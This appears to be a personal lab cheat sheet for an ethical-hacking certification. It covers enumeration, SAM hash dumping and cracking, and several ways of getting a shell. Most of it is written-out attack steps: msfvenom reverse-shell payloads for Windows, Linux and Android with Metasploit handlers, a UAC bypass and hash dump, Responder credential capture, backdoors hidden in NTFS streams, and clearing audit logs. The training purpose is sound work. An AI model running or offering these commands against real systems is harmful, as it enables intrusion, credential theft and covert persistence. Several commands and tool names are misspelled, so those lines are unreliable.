# Enumeration

- ping example.com –f –l 1500 ****-> Frame size
- tracert www.url.com -> Determining hop count

### Net use

$ nbtstat -A ip-of-server

$ net use → view created null sessions

$ net use \\10.10.10.10\e “”/user:””

$ net user → view user info

### SNMP enum = enumerate usernames and devices on smtp enabled devices

Nmap scan for SNMP service, nse scripts, Metasploit to enumerate SNMP
auxiliary/scanner/snmp/snmp_brute or snmp_login

### enum4linux= kali Linux tool

enum4linux -u username -p password [option] IP
option = -U -> user details, -G -> group info , -P -> password policy info, -S -> shares, -o -> os info

### AD explorer

- windows tool ->get user details and machine details'
provide IP address, uname & password if you have -> acc which has admin privs

### **Enumeration using Metasploit**

msfdb init

service postgresql start

msfconsole

msf > db_status

nmap -Pn -sS -A -oX Test 10.10.10.0/24

db_import Test

hosts -> To show all available hosts in the subnet

db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine

services -> to get all available services in a subnet

# Vuln analysis & network scanning

1. Nessus - web vulns scanning you know
windows browser - run Nessus - localhost:8834
2. CGI scanning with Nikto - kali linux tool
nikto -h hostname -Tuning 1

# system hacking

### Dump & crack SAM hashes (Sys Acc Manager)

SAM - database file on windows -> store user accounts and security descriptors locally.
stores passwords in hash format (LM and NTLM hashes)
password crack, pass the hash, unauth access using same passwds, password analysis, pattern recognition
Admin access to dump SAM file...

pwdump7 - dump protected files, ophcrack - rainbow table 14 chars

> wmic useraccount get name,sid
pwdump7 - capture hash
ophcrack - crack hash and fid plaintext passwd
> 

### create and use rainbow tables

-> server 12
tools to create rainbow - winrtgen
add table > rainbow table properties > hash=ntlm, min len=4,max len=6, chain count=4000000,charset=loweralpha > ok > ok > stop after some time
these hashes will use in rainbowcrack
password cracking tools > rainbow crack
rceack_gui.exe > file > load ntlm hashes from pwdump file > open hashes.txt that you have got from pwdump7 > rainbow table > search raibow tables > select your rainbow table file

### Audit sys passwds using L0phtCrack

passwd cracking tools > l0phtcrack - trial
password auditing wizard > next > tarfet sys type=windows > a remote machine > username, passwd , domain > strong passwd audit > both > run job immidiatly > finish > perform colaboration=no
copy lc agenet = yes.. it wil take 5 hours > stop

### Exploit client side vulns & establish VNC session

-> kali linux
terminal > $mssfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=kali-ip LPORT=1234 -o /root/desktop/test.exe
paste payload in /var/www/html, modify perms=755, and user = www-data and start apache 2
start msfconsole

> use exploit/multi/handler
set payload win....
set LHOST kali-ip
set LPORT 1234
run
> 
- go to windows 10 > browser > download payload > run it
- go to kali > you got a shell

> sysinfo
run vnc
> 
- accessed windows desktop from kali

### Escalate privs by exploiting client side vulns

-> kali linux
generate msfvenom payload

> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=kali-ip -f exe > desktop/exploit.exe
create shareb folder in /var/www/html nd give permissions
$ chmod -R 755 share && chown -R www-data:www-data ...
paste your payload there, start apache2 then msfconsole & access file via windows and execute it.
get shell in meterpreter, sysinfo , whoami
use exploit/windows/local/bypassuac_fodhelper
show options
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 10.10.10.11
set TARGET 0
run
shell > getuid
getsystem
getuid
run post/windows/gather/smart_hashdump
> 
- successfully extract htlm hashes

### HAcking windows using metasploit & post exploitation using meterpreter

windows - have file in computer
kali linux -
$ msfvenom -p windows/meterpreter/reverse_tcp ..... same as above an exe file

- share it with windows as above
- run metasploit using multi/handler exploit
- get shell as above

### Hide files using NTFS stream

cmd > notepad file.txt

> type program.exe > file.txt:program.exe
mklink backdoor.exe file.txt:program.exe
> 
- when you execute backdoor.exe - program.exe will be executed

### Hide data using whitespace steganography

snow tool

- create text file
go to tool - snow & open cmd window there

> snow -C -m "hide this text" -p "passwd" file.txt secret.txt
snow -C -p "passwd" secret.txt  #  extract data in cmd, In GUI it's in white space format
> 

### Image steganography using openstego

openstego.exe
message file , cover file, output stego file, passwd
extract in similar way

### Quickstego - same as above

### viewing,enabling, clear audit plocies using Auditpol

> auditpol /get /category:*
auditpol /set /category:"name(i.e. system)" /success:enable /failure:enable
auditpol /clear /y
> 

### Convert channels using convert_TCP

-> kali linux
$ echo "secret" > msg.txt

- connect with other locations - smb://10.10.10.16
- copy convert_tcp.c file from system hacking windows to linux
- compile c file... $ cc -o convert_tcp convert_tcp.c
- same process on ubuntu
-> ubuntu - sudo su

```bash
./convert_tcp -dest ubuntu-ip -source kali-ip -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/receive.txt
```

- go to kali, open wireshrak - eth0 , terminal

```bash
./convert_tcp -dest ubuntu-ip -source kali-ip -source_port 8888 -dest_port 9999 -file /root/Desktop/send/receive.txt
```

### Hack windows server 2012 with thefatrat

-> kali linux
$ fatrat .. then provide numbers .. generate payload, and backdoor

- share it with /var/www/html/share.. start apache2, download in windows
- run and get shell

### Active online attack using responder

-> kali linux
$ responder -I eth0
files - /usr/share/responder/logs/logfile.txt
$ john /path/to/log/file/logfile.txt - you will get cracked password

# session hijacking

- > windows 10, chrome
- set up proxy from chrome settings
-> server 2016 , owasp zap
--- you can do it by burp and kali, so prefer it first.

# hacking web servers

### perform recon using skipfish

```bash
$ skipfish -S /usr/share/skipfish/dictionaries/complete.wl -o /root/test [http://url:8080/](http://url:8080/)
```

### footprint server using httprecon

-> server 2016 - httprecon.exe

### footprinting server using id serve - banner grabbing

-> server 2016

### crack ftp creds using dictionary attack

hydra and medusa
medusa - GUI tool
use hydra

### uniscan server fingerprinting in kali

-> kali linux
$ uniscan -h
$ uniscan -u url -qweds

# SQLi

1. you know it

# Crypto

### Disk Encryption using veracrypt

- create volume on the desktop
- Algo - AES, hash - SHA512, size - 2MB, create and mount
- paste you secret drives into this drive from this pc
- then dismount from veracrypt
- All your files are encrypted, disappeared and safe.

→ windows administrative tools/IIS manager in windows to create and use self-signed cert.

# cloud - owncloud

### create user accounts & assign user rights

- > windows server
- install owncloud desktop and run
- browser > http://url_of_cloud/owncloud
- Login - admin
-> windows 10
- login - normal user
- copy files directly in the file manager, notice there is an admin cloud account because of windows sharing
-> kali linux
- generate meterpreter payload exe file and upload it
$ msfvenom -p windows/meterpreter/reverse_tcp -f exe > trojen.exe
- browser > login as normal user & upload payload in shared folder
- generate linux payload elf file
$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=kali-ip LPORT=1234 --platform linux -f elf > exploit.elf
- upload it in shared folder
$ msfconsole

> use multi/handler
set payload linux/x86....
set LHOST & LPORT & run
> 
- save exploit in ubuntu, change perms and run it
- get shell

### Hacking android platform

$ msfvenom -p android/metertreter/reverse_tcp —platform android -a dalvik LHOST=attacker R > backdoor.apk

→ paste it into var/www/html, change perms and user, share it on your apache server and start msfconsole

>use exploit/multi/handler

>set payload above_payload

>set LHOST=attacker

>show options

>exploit/run

 → go to android and download backdoor, run it - package installer

→ get shell.
